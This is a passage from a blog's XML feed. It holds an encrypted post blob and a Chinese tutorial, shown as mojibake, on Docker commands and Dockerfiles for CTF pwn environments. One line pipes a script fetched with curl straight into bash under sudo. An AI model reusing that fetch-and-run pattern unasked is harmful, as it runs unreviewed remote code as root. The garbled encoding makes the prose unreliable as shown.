ceb6b0ae25948cab528ef02314e377c56146fc09d44918537be5aa408294da3ef6e850a5af93ada8bae296fbbf9347484d721ad1c73f3cec943e78ad5e951f0a6f59a46a25244931b99ac090d7b68962ee9a41ca311939396d88fe41394dc50674ac5723ebf8fa2f395d9c3351e21c1956389ed5a33fb9ecbabcd4bc2b858ab999cfb2bbc8cd83a159c16f122a51da6f98fff22244d3a15c55919f2fb4c1bf096e89790992e39de7fc2c506f16378f1100c0eff889a9685d03257ef59f25f42b93e5eb011dbe70c34da598ec831d38c46ac77d4fee91e5ded3190e873db8dcbe29661195823f81c1f52c0e0350c77bda8c5da7c543b5f4d036164df153f452d6a620c2ff3aa05fceb549f835592b534b708a6e5d6dd86ab91ed025394cf78ae1d6a8788828f3c65c54f1c29428faf3d3f8efccdf4bae6c41c0e0016d9186c727143b4fda4dcede57f5df5620d511b2b43e66edf87696f948fc7ab7a98c64d05d71e6b7dc2deb547958e0e6553c3ae6eb404ef9d9c72567f6f6c6faacacd042059471d5f9da15a3d094713129f3d965f9dacf11d782e7b4de1432d7cfa108a4a5d120de123db3c2ed88a46e07bb5bfdaaf2dbe2faa4166be7266832f83f5c8552aa6bcceff91856f6fe31575e2e674b875211d74d0f66ca2dee68afe9c5d3895b9904deb28e4573a63997304e5e183ca26ced781bb75087facd59d189bf031d371f83d0b17104c3885e8e993d26344d0428e93ff08e515d909b6786c421c3b931f406a07745209632ad9cf920ff7a13cccb93c2bee2d6f8fa08694b3b39a3c08ad15f4e9918c3ec3e761d8c7c46fb366d21c6a45f51506956cb9cbe3a193e8cfcabf66ecc17a64abea2e74625cfc9e806315898eca0a69b4442eef788035bc1b0884fc48a4fe8f3ae5f7b3225261f713d4183e0021413df67669615bbea5a0950f467451639ccc64e1253ae075a8f7ee48c93f8abe6d268998d90d8a302379e6a4fcb1cf7b5e3f83e1cf65507d709ec39d68da9b95276a258ef9b2f0a4f82d647d2819a8e6daf28a3e7633e4cc912995704f6e2c43ceb93998bcf7c5c5502714946db0ddee7284f7c4730e3c69c8ad6046574d5f22a0b90c7afc84d61e829ba37cffee1f2d7b71b929e481e2081060e57f465ae924a2ad96996cbf7cd7c7bba42637318e65cb0b4153e9779a242fbf476d6f861951147f4f365f17890ff2d3ea9aa38d6500cd9c60d51a3560861628b34ff5b430386772a1e879a1738989962767f9eec136757bd91d532591e4ef02fb0e4ae2cd21791f4defc8a28634ff66d303707298d593f68fcd101445566c3116a3bcd1d25b7010e406d88845dcc32cfa2505f63ee229c457abb29bc3a731146a124cd62d86959ed1986efbcc6d9f9182b734e6554ff71a31f150b6b5e1c7fdc101a4f64758ce7a4160209e58583</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> æ‹Ÿæ€é˜²å¾¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹dockerå­¦ä¹ è¿›è¡Œçš„å°æ€»ç»“</title>
      <link href="/posts/80648483.html"/>
      <url>/posts/80648483.html</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºæ‰“CTF pwné¢˜çš„æ—¶å€™ï¼Œç»å¸¸é‡è§æœ¬åœ°ç¨‹åºçš„libcä¸è¿œç¨‹æœåŠ¡å™¨é‚£è¾¹ç¨‹åºæ‰€ä¾èµ–çš„libcä¸åŒ¹é…çš„æƒ…å†µï¼Œå°½ç®¡å¯ä»¥ç”¨patchelfå’Œglibc-all-in-oneæ¥ç»™ç¨‹åºpatchä¸€ä¸ªlibcã€‚ä½†æ˜¯patchelfä¼¼ä¹æœ‰ç‚¹å°bugï¼Œä¸ºäº†é˜²æ­¢æ¯”èµ›çš„æ—¶å€™åœ¨è¿™ä¸ªåœ°æ–¹æ‰é“¾å­ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨åœ¨dockeré‡Œè·‘ä¸åŒç‰ˆæœ¬çš„ubuntuã€‚</p><p>åŒæ—¶éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè‡ªå·±ä¹Ÿä»ä¸€ä¸ªæ‹‰è·¨çš„åšé¢˜äººå¶å°”å®¢ä¸²äº†ä¸€ä¸‹æ‹‰è·¨çš„å‡ºé¢˜äººï¼Œå› æ­¤éœ€è¦æ‰“åŒ…ä¸€ä¸ªé¢˜ç›®ç¯å¢ƒï¼Œè¿˜å¾—å­¦ä¹ ä¸€ä¸‹dockerçš„å‡ ä¸ªåŸºæœ¬é…ç½®æ–‡ä»¶ã€‚</p><p>æœ¬æ–‡æ˜¯å¯¹æˆ‘å­¦ä¹ dockeråšäº†ä¸€ä¸ªç®€å•çš„å°æ€»ç»“ã€‚</p><h3 id="docker-å®¹å™¨-é•œåƒ"><a href="#docker-å®¹å™¨-é•œåƒ" class="headerlink" title="docker å®¹å™¨ é•œåƒ"></a>docker å®¹å™¨ é•œåƒ</h3><p>Dockeræ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨ç¼–æ’å·¥å…·ï¼Œå®ƒå…è®¸å¼€å‘äººå‘˜åœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šæ‰“åŒ…å’Œè¿è¡Œåº”ç”¨ç¨‹åºã€‚</p><p>å®¹å™¨æ˜¯ä¸€ç§è½»é‡çº§çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒå…è®¸åœ¨å•ä¸ªæ“ä½œç³»ç»Ÿä¸­è¿è¡Œå¤šä¸ªéš”ç¦»çš„åº”ç”¨ç¨‹åºã€‚å®¹å™¨è¿è¡Œæ—¶ä¼šåœ¨é•œåƒçš„åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªå¯å†™å±‚ï¼Œè€Œé•œåƒæœ¬èº«æ˜¯åªè¯»çš„ã€‚</p><p>é•œåƒæ˜¯å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€è¦çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåŒ…å«äº†å®¹å™¨è¿è¡Œæ—¶éœ€è¦çš„æ‰€æœ‰è½¯ä»¶ï¼Œé…ç½®æ–‡ä»¶å’Œç¯å¢ƒå˜é‡ç­‰ã€‚é•œåƒæ˜¯é™æ€çš„ï¼Œä¸èƒ½è¿è¡Œå‘½ä»¤ï¼Œåªèƒ½è¢«ç”¨æ¥åˆ›å»ºå®¹å™¨ã€‚</p><p>æ€»ä¹‹ï¼ŒDockeræ˜¯ä¸€ç§å·¥å…·ï¼Œå®¹å™¨æ˜¯è¿è¡Œåœ¨Dockerä¸Šçš„ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œé•œåƒæ˜¯å®¹å™¨è¿è¡Œæ‰€éœ€è¦çš„æ–‡ä»¶ç³»ç»Ÿã€‚</p><h2 id="dockerå®‰è£…"><a href="#dockerå®‰è£…" class="headerlink" title="dockerå®‰è£…"></a>dockerå®‰è£…</h2><p>ä¸€æ¡å‘½ä»¤å®‰è£…docker:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰å®‰è£…curlçš„è¯ï¼Œå…ˆå®‰è£…curl:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install curl</span><br></pre></td></tr></table></figure><h2 id="ubuntuä¸åŒç‰ˆæœ¬å¯¹åº”é»˜è®¤libcï¼š"><a href="#ubuntuä¸åŒç‰ˆæœ¬å¯¹åº”é»˜è®¤libcï¼š" class="headerlink" title="ubuntuä¸åŒç‰ˆæœ¬å¯¹åº”é»˜è®¤libcï¼š"></a>ubuntuä¸åŒç‰ˆæœ¬å¯¹åº”é»˜è®¤libcï¼š</h2><blockquote><p>éœ€è¦ä»€ä¹ˆç‰ˆæœ¬libcï¼Œæ¥ä¸‹æ¥ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬é•œåƒå³å¯</p><p>22.04â€”-&gt;2.35-0ubuntu3</p><p>21.04â€”-&gt;2.33-0ubuntu5</p><p>20.04â€”-&gt;2.31-0ubuntu9.7</p><p>21.10â€”-&gt;2.34-0ubuntu3.2</p><p>18.04â€”-&gt;2.27-3ubuntu1.5</p></blockquote><h2 id="ä¸‹è½½é•œåƒ"><a href="#ä¸‹è½½é•œåƒ" class="headerlink" title="ä¸‹è½½é•œåƒ"></a>ä¸‹è½½é•œåƒ</h2><p>roderickå¸ˆå‚…ç¼–è¯‘äº†å¾ˆå¤šç‰ˆæœ¬çš„é•œåƒ,åœ¨ä¸‹é¢è¿™ä¸ªé“¾æ¥ä¸‹è½½(ä½¿ç”¨roderickå¸ˆå‚…çš„é•œåƒï¼Œè¿è¡Œèµ·æ¥çš„å®¹å™¨é‡Œé¢è¦ç”¨gdb.attachçš„è¯ï¼Œéœ€è¦æŒ‡å®šç»ˆç«¯tmuxï¼Œroderickå¸ˆå‚…æŠŠä¸€äº›å¿«æ·é”®ç»™æ”¹äº†ï¼Œå…·ä½“è¯·åœ¨å®¹å™¨é‡Œè¾“å…¥cat ~&#x2F;.tmux.conf æ¥æŸ¥çœ‹ï¼‰</p><p><a href="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags">https://hub.docker.com/r/roderickchan/debug_pwn_env/tags</a></p><p><img src="/../img/2706180-20220516184739994-1663794444.png"></p><p>ç‚¹è¿™ä¸ªï¼Œç„¶åç›´æ¥ç²˜åˆ°è™šæ‹Ÿæœºä¸Šå°±å¼€å§‹ä¸‹è½½äº†ï¼ˆæ³¨æ„æƒé™é—®é¢˜ï¼‰ã€‚</p><p>æˆ‘ç®€å•è¯´ä¸€ä¸‹è¿™ä¸ªdockeræ˜¯å’‹ç”¨çš„</p><blockquote><p>åˆšåˆšä¸‹è½½ä¸‹æ¥çš„é•œåƒï¼Œè¦å®ä¾‹åŒ–æˆå®¹å™¨ï¼ˆä¹Ÿå°±æ˜¯è®©å®¹å™¨è¿è¡Œèµ·æ¥ï¼‰ã€‚å½“å®¹å™¨è¿è¡Œèµ·æ¥ä¹‹åï¼Œæˆ‘ä»¬å°±ç›¸å½“äºæœ‰äº†â€å¦ä¸€ä¸ªç‰ˆæœ¬çš„ubuntuâ€ã€‚å¦‚æœä½ æƒ³é€€å‡ºå®ƒå¯ä»¥ç”¨exitï¼Œæ­¤æ—¶å®ƒä¾ç„¶æ˜¯è¿è¡ŒçŠ¶æ€ï¼Œå¦‚æœä½ åœæ­¢äº†ä¸€ä¸ªå®¹å™¨ï¼Œé‚£ä¹ˆæ­¤æ—¶å®ƒå¤„äºåœæ­¢çŠ¶æ€ï¼Œä¸è¿‡ä¸ç®¡æ˜¯ä½ exitè¿˜æ˜¯stopè¿˜æ˜¯å…³æœºï¼Œå®¹å™¨ä¾ç„¶å­˜åœ¨ï¼ˆé‡Œé¢ä½ æ–°ä¸‹è½½çš„æ–‡ä»¶ä¹Ÿå­˜åœ¨ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨startå¼€å¯åœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œå¦‚æœåˆ é™¤äº†å®¹å™¨ï¼Œåˆ™é‡Œé¢ä½ æ–°ä¸‹è½½çš„æ–‡ä»¶ä¼šæ¶ˆå¤±ï¼ˆå®¹å™¨åŸæœ¬çš„æ–‡ä»¶ä¸ä¼šæ¶ˆå¤±ï¼‰</p></blockquote><h2 id="æœç´¢é•œåƒ"><a href="#æœç´¢é•œåƒ" class="headerlink" title="æœç´¢é•œåƒ"></a>æœç´¢é•œåƒ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search å…³é”®å­—</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨docker searchå‘½ä»¤æœç´¢å®˜æˆ¿ä»“åº“ä¸­çš„å…±äº«é•œåƒã€‚</p><h2 id="æ‹‰å–é•œåƒ"><a href="#æ‹‰å–é•œåƒ" class="headerlink" title="æ‹‰å–é•œåƒ"></a>æ‹‰å–é•œåƒ</h2><p>å¯¹äºDockeré•œåƒæ¥è¯´ï¼Œå¦‚æœä¸‹è½½é•œåƒæ—¶ä¸æŒ‡å®šæ ‡ç­¾ï¼Œé»˜è®¤ä¼šä¸‹è½½ä»“åº“ä¸­æœ€æ–°ç‰ˆæœ¬çš„é•œåƒï¼Œå³é€‰æ‹©<br>æ ‡ç­¾latestã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull ä»“åº“åç§°[:æ ‡ç­¾]</span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹é•œåƒæˆ–è€…å®¹å™¨"><a href="#æŸ¥çœ‹é•œåƒæˆ–è€…å®¹å™¨" class="headerlink" title="æŸ¥çœ‹é•œåƒæˆ–è€…å®¹å™¨"></a>æŸ¥çœ‹é•œåƒæˆ–è€…å®¹å™¨</h2><p>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å·²æœ‰é•œåƒï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure><h2 id="å¯åŠ¨å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨"></a>å¯åŠ¨å®¹å™¨</h2><p>è¿™æ„å‘³ç€æ˜¯åœ¨æŠŠä¸€ä¸ªé•œåƒç»™å®ä¾‹åŒ–ï¼ˆé™¤éåˆ é™¤ï¼Œä¸ç„¶å¯åŠ¨çš„å®¹å™¨ä¸ä¼šæ¶ˆå¤±ï¼ˆå³ä½¿ä¸»æœºé‡å¯,æˆ–è€…è¾“å…¥stopï¼Œæˆ–è€…exitï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it IMAGE ID /bin/bash</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å·²åœæ­¢çš„å®¹å™¨(å¯åŠ¨è¢«stopæš‚åœçš„å®¹å™¨)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker start  CONTAINER ID</span><br></pre></td></tr></table></figure><h2 id="è¿›å…¥å®¹å™¨-amp-amp-é€€å‡ºå®¹å™¨"><a href="#è¿›å…¥å®¹å™¨-amp-amp-é€€å‡ºå®¹å™¨" class="headerlink" title="è¿›å…¥å®¹å™¨&amp;&amp;é€€å‡ºå®¹å™¨"></a>è¿›å…¥å®¹å™¨&amp;&amp;é€€å‡ºå®¹å™¨</h2><p>è¿›å…¥å®¹å™¨çš„å‰ææ˜¯å®¹å™¨å¿…é¡»å¯åŠ¨ï¼ˆä¹Ÿå°±æ˜¯ç”¨docker pså¯ä»¥çœ‹åˆ°å®¹å™¨)ï¼Œå¦‚æœå®¹å™¨å¤„äºäº†åœæ­¢çŠ¶æ€ï¼Œéœ€è¦ç”¨docker startå°†å…¶å¯åŠ¨ï¼Œç„¶åå†è¿›å…¥å®¹å™¨.</p><p>ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤éƒ½å¯ä»¥è¿›å…¥å®¹å™¨ï¼ŒäºŒè€…åŒºåˆ«åœ¨äºå‰è€…ä½¿ç”¨ä¹‹åæ‰§è¡Œexitä¼šé¡ºä¾¿æŠŠå®¹å™¨åœæ­¢ï¼Œè€Œåè€…æ‰§è¡Œexitï¼Œå®¹å™¨ä¾ç„¶åœ¨è¿è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker attach  CONTAINER ID</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦ä»¥rootæƒé™è¿›å…¥å®¹å™¨çš„è¯ï¼Œå‘½ä»¤å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it -u root CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure><p><strong>é€€å‡ºå®¹å™¨æ‰§è¡Œ<code>exit</code>å³å¯ï¼Œåªè¦å®¹å™¨è¢«å¯åŠ¨ï¼Œåˆ™è¾“å…¥ä¸Šè¿°å‘½ä»¤å°±èƒ½å†æ¬¡è¿›å…¥ã€‚</strong></p><h2 id="åˆ é™¤é•œåƒæˆ–è€…å®¹å™¨"><a href="#åˆ é™¤é•œåƒæˆ–è€…å®¹å™¨" class="headerlink" title="åˆ é™¤é•œåƒæˆ–è€…å®¹å™¨"></a>åˆ é™¤é•œåƒæˆ–è€…å®¹å™¨</h2><p>åˆ é™¤æŒ‡å®šçš„å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rm -f CONTAINER ID</span><br></pre></td></tr></table></figure><p>åˆ é™¤æŒ‡å®šçš„é•œåƒï¼ˆåˆ é™¤é•œåƒä¹‹å‰éœ€è¦å…ˆåœæ­¢å®¹å™¨ï¼Œç„¶åå…ˆåˆ å®¹å™¨ååˆ é•œåƒï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rmi IMAGE ID</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„å‘½ä»¤å¯ä»¥æ¸…ç†æ‰æ‰€æœ‰å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker container prune</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ‰€æœ‰é•œåƒ(å¦‚æœè¢«å®ä¾‹åŒ–çš„é•œåƒæ˜¯ä¸èƒ½åˆ é™¤çš„)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker system prune -a</span><br></pre></td></tr></table></figure><h2 id="åœæ­¢å®¹å™¨"><a href="#åœæ­¢å®¹å™¨" class="headerlink" title="åœæ­¢å®¹å™¨"></a>åœæ­¢å®¹å™¨</h2><p>è¯·æ³¨æ„åœæ­¢å®¹å™¨å’Œåˆ é™¤å®¹å™¨çš„åŒºåˆ«ï¼šåœæ­¢å®¹å™¨ï¼Œä»…ä»…æ˜¯ç”¨docker psæŸ¥çœ‹ä¸åˆ°äº†ï¼ˆå› ä¸ºä»–ä¸å†è¿è¡Œäº†ï¼Œä½†å®ƒä¾ç„¶å­˜åœ¨ï¼Œåªä¸è¿‡å±äºåœæ­¢çŠ¶æ€ï¼Œç”¨docker ps -aå¯ä»¥æŸ¥çœ‹åˆ°ï¼‰</p><p>åœæ­¢å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker stop CONTAINER ID</span><br></pre></td></tr></table></figure><h2 id="å°†æ–‡ä»¶ä»ä¸»æœºå¤åˆ¶åˆ°docker"><a href="#å°†æ–‡ä»¶ä»ä¸»æœºå¤åˆ¶åˆ°docker" class="headerlink" title="å°†æ–‡ä»¶ä»ä¸»æœºå¤åˆ¶åˆ°docker"></a>å°†æ–‡ä»¶ä»ä¸»æœºå¤åˆ¶åˆ°docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker cp file CONTAINER ID:Destination_directory</span><br></pre></td></tr></table></figure><h2 id="æŒ‚è½½å‘½ä»¤"><a href="#æŒ‚è½½å‘½ä»¤" class="headerlink" title="æŒ‚è½½å‘½ä»¤"></a>æŒ‚è½½å‘½ä»¤</h2><p>å¯ä»¥é€šè¿‡æŒ‚è½½çš„æ–¹å¼æ¥è®©å®¿ä¸»æœºå’ŒDockerç›´æ¥æ¥å…±äº«æ–‡ä»¶ã€‚ï¼ˆä¸‹é¢è¿™ä¸ªæ–¹æ³•åªé€‚ç”¨äºåˆ›å»ºæ–°çš„å®¹å™¨æ—¶åŒæ—¶åˆ›å»ºå…±äº«ç›®å½•ï¼Œä¸é€‚äºåæœŸæ·»åŠ å…±äº«ç›®å½•ï¼‰</p><p>åˆ›å»ºå®¹å™¨æ—¶æ‰§è¡ŒDocker Volume</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd --volume /tmp/source:/tmp/destination --name test ubuntu/nginx bash</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --volume /home/hacker/Desktop/ROPgadget:/home/roderick/ROPgadget --name test roderickchan/debug_pwn_env:22.04</span><br></pre></td></tr></table></figure><p>è§£é‡Š:å°†æœ¬æœºä¸Šçš„ROPgadgetæ–‡ä»¶å¤åˆ¶åˆ°å®¹å™¨é‡Œé¢,å‘½åä¸ºtestã€‚</p><p>æœ¬äººä¹Ÿåªæ˜¯åˆšå¼€å§‹æ¥è§¦dockerçš„ä½¿ç”¨ï¼Œå¦‚æœä¸Šè¿°ç†è§£åˆä»€ä¹ˆé—®é¢˜ï¼Œæ¬¢è¿å„ä½å¸ˆå‚…æ–§æ­£ï¼Œå¦‚æœä»¥åç”¨åˆ°äº†dockerçš„å…¶ä»–ç”¨æ³•ï¼Œæˆ‘ä¼šæ›´æ–°è¿™ç¯‡æ–‡ç« ã€‚</p><p>ä¸‹é¢ä¸ºåæ¥çš„æ›´æ–°éƒ¨åˆ†ï¼š</p><h2 id="NAMESæœ‰äº›åœ°æ–¹å¯ä»¥ä»£æ›¿CONTAINER-ID"><a href="#NAMESæœ‰äº›åœ°æ–¹å¯ä»¥ä»£æ›¿CONTAINER-ID" class="headerlink" title="NAMESæœ‰äº›åœ°æ–¹å¯ä»¥ä»£æ›¿CONTAINER ID"></a>NAMESæœ‰äº›åœ°æ–¹å¯ä»¥ä»£æ›¿CONTAINER ID</h2><p>ä¸Šé¢çš„å‘½ä»¤æˆ‘ä¸€ç›´ä»¥ä¸º CONTAINER IDè¦è¾“å…¥ä¸‹é¢è¿™ä¸ªä¸œè¥¿æ‰è¡Œ</p><p><img src="/../img/Ih2DLZlwiQbz1qu.png" alt="image-20220621182948850"></p><p>åˆšæ‰æˆ‘è¯•äº†ä¸€ä¸‹å‘ç°ä¹Ÿå¯ä»¥è¾“å…¥NAMESæ¥ä»£æ›¿ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªä¸œè¥¿ã€‚</p><p><img src="/../img/OdYqF5tSKkEmwHM.png" alt="image-20220621183420059"></p><p>ä»¥å¯åŠ¨è¿™ä¸ªglibc2.33çš„å®¹å™¨ä¸¾ä¾‹ï¼Œé‡æ–°å¯åŠ¨dockerçš„æ—¶å€™ï¼Œè¾“å…¥ sudo docker start  glibc2.33å³å¯ã€‚</p><h2 id="å®¹å™¨çš„é‡å‘½å"><a href="#å®¹å™¨çš„é‡å‘½å" class="headerlink" title="å®¹å™¨çš„é‡å‘½å"></a>å®¹å™¨çš„é‡å‘½å</h2><p>å¦‚æœæœ€å¼€å§‹åˆ›å»ºå®¹å™¨çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œå‘½åï¼Œé‚£ä¹ˆå°±ä¼šéšæœºç»™è¿™ä¸ªå®¹å™¨åˆ†é…ä¸€ä¸ªåå­—ï¼Œä¹‹åå¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸ªå‘½ä»¤ç»™å®¹å™¨é‡å‘½åï¼ˆdocker1ä¸ºå®¹å™¨åŸæœ¬çš„åå­—ï¼Œdocker2ä¸ºå®¹å™¨çš„æ–°åå­—ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker rename docker1 docker2</span><br></pre></td></tr></table></figure><h2 id="dockerçš„åŸºæœ¬é…ç½®æ–‡ä»¶"><a href="#dockerçš„åŸºæœ¬é…ç½®æ–‡ä»¶" class="headerlink" title="dockerçš„åŸºæœ¬é…ç½®æ–‡ä»¶"></a>dockerçš„åŸºæœ¬é…ç½®æ–‡ä»¶</h2><p>åœ¨å‡ºé¢˜çš„æ—¶å€™ï¼Œéœ€è¦å»éƒ¨ç½²ä¸€ä¸‹dockerï¼Œä¸€èˆ¬æ¥è¯´ç”¨é‚£ä¸ªctf_xinetdé¡¹ç›®æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ï¼Œç›¸å…³ç”¨æ³•ä¸åšä»‹ç»äº†ï¼Œç½‘ä¸Šä¸€æœä¸€å †ã€‚</p><p>ä¸»è¦æ˜¯ç®€å•è¯´ä¸€ä¸‹å‡ ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨ä»¥åŠä»£ç çš„ç®€å•åˆ†æ</p><p>æˆ‘æ‰¾äº†ä¹‹å‰å‡ºè¿‡çš„ä¸€ä¸ªé¢˜ç›®çš„dockeræ–‡ä»¶ï¼Œæ¥è§£é‡Šä¸€ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301122106949.png" alt="image-20230112210646788"></p><p>æœ‰ä»¥ä¸Šå‡ ä¸ªåŸºæœ¬çš„é…ç½®æ–‡ä»¶</p><h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>ç”¨äºæ„å»ºé•œåƒçš„é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†æ„å»ºé•œåƒæ‰€éœ€çš„å„ç§æŒ‡ä»¤ï¼Œå¦‚é…ç½®ç¯å¢ƒï¼Œå®‰è£…è½¯ä»¶ï¼Œé…ç½®å¯åŠ¨å‘½ä»¤ç­‰ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span> <span class="comment">#è¯¥æŒ‡ä»¤å‘Šè¯‰Dockeræˆ‘ä»¬è¦åœ¨åŸºäºUbuntu 18.04é•œåƒè¿›è¡Œæ“ä½œï¼Œå¦‚æœä½ æœ¬åœ°æ²¡æœ‰è¯¥é•œåƒï¼ŒDockerä¼šå»Docker hubä¸Šä¸‹è½½</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd</span></span><br><span class="line"><span class="comment">#ä¸Šè¿°æŒ‡ä»¤é¦–å…ˆå°†ubuntuçš„é•œåƒæºæ›¿æ¢ä¸ºæ¸…åå¤§å­¦çš„é•œåƒæºï¼Œæ›´æ¢é•œåƒæºçš„ç›®çš„æ˜¯ä¸ºäº†æ›´å¿«çš„ä¸‹è½½è½¯ä»¶åŒ…</span></span><br><span class="line"><span class="comment">#å…¶æ¬¡æ›´æ–°äº†ç³»ç»Ÿè½¯ä»¶åŒ…ï¼Œç¡®ä¿ç³»ç»Ÿæ˜¯æœ€æ–°çš„çŠ¶æ€</span></span><br><span class="line"><span class="comment">#æœ€åå®‰è£…libc32z1å’Œxinetdä¸¤ä¸ªè½¯ä»¶åŒ…</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf <span class="comment">#åˆ›å»ºåä¸ºctfçš„ç”¨æˆ·ï¼Œ-mè¡¨ç¤ºåˆ›å»ºç”¨æˆ·çš„åŒæ—¶åˆ›å»ºç”¨æˆ·çš„ä¸»ç›®å½•</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf <span class="comment">#å°†å·¥ä½œç›®å½•è®¾ç½®ä¸º/home/ctf</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \ </span></span><br><span class="line">    cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 /home/ctf/dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/cat /home/ctf/bin</span></span><br><span 